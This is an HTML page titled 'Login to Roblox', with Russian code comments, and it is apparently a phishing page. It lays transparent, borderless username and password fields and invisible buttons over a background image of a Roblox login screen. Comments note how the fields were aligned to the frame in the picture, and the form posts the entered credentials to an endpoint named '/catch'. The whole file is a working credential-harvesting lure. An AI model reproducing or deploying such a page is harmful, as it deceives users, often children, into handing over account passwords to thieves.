<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .auth-container {
            background: transparent;
            width: 100%;
            max-width: 360px; /* Уменьшили ширину ровно под рамку на картинке */
            padding: 0;
            margin-top: -35px; /* Подняли выше, чтобы точно совпало */
            margin-left: 0px;
            box-sizing: border-box;
        }

        h1, .link-text, .signup-text {
            display: none !important;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .input-control {
            width: 100%;
            height: 38px;
            background: transparent !important; /* Убираем любой фон */
            border: none !important;             /* Убираем любые рамки */
            outline: none !important;            /* Убираем обводку при клике */
            color: #ffffff;
            font-size: 14px;
            padding: 0 10px;
            box-sizing: border-box;
            box-shadow: none !important;         /* Убираем тени браузера */
        }

        /* Полностью убираем подсвечивание и появление фона при фокусе */
        .input-control:focus {
            background: transparent !important;
            outline: none !important;
            border: none !important;
            box-shadow: none !important;
        }

        .input-control::placeholder {
            color: transparent; /* Скрываем текст-подсказку */
        }

        .btn-submit {
            width: 100%;
            height: 38px;
            background: transparent !important;
            border: none !important;
            outline: none !important;
            cursor: pointer;
            margin-top: 8px;
            color: transparent;
        }

        .secondary-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 50px;
        }

        .btn-secondary {
            width: 100%;
            height: 36px;
            background: transparent !important;
            border: none !important;
            outline: none !important;
            cursor: pointer;
            color: transparent;
        }

        .error-message {
            display: none;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <form action="/catch" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required autocomplete="off">
            <input type="password" name="password" class="input-control" placeholder="Password" required autocomplete="off">
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

</body>
</html>
